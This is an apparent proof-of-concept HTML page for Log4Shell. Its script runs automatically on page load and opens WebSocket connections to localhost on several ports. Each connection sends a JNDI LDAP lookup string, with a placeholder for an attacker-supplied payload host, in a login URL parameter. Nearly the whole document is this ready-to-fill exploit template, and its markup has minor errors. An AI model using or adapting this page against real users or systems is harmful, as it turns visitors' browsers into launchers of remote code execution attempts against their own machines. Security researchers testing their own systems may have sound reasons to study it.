<!DOCTYPE HTML>

<html>
   <head>

      <script type = "text/javascript">
         function WebSocketConnect() {
            if ("WebSocket" in window) {
               let ports = ["21","25","139","445","8888","8090","8091","8080","1820"];
               document.getElementById("portsUsed").innerHTML = ports;
               for(var i=0; i < ports.length; i++) {
                   const port = ports[i];
                   setTimeout(function(){
                       // open a web socket --> make sure to update the String to point to the relevant things. it can be anything. 
                       var ws = new WebSocket("ws://localhost:" + port + "/login?username=${jndi:ldap://<<payload>>}"); //update info
                       ws.onopen = function() {
                          // Web Socket is connected, send data using send()
                          ws.send("Message to send");
                          console.log("Message is sent...");
                       };

                       ws.onmessage = function (evt) {
                          var received_msg = evt.data;
                          console.log("Message is received...");
                       };

                       ws.onclose = function() {

                          // websocket is closed.
                          console.log("Connection is closed...");
                       };
                  }, 50);
              }
            } else {

               // The browser doesn't support WebSocket
               console.log("WebSocket NOT supported by your Browser!");
            }
         }
      </script>

   </head>
   <body onload="WebSocketConnect()">
     <center>
             <h1>Log4j Websocket Testing...</h1>
             <hr>
             <img src="llama.jpeg" alt="LaLaLama4Shell Logo" width="300px" />
             <h3>Attempting Connections to localhost via websockets on the following ports: <span id="portsUsed"></span></h3>
             <div id="status"></div>
     </div>
   </body
</html>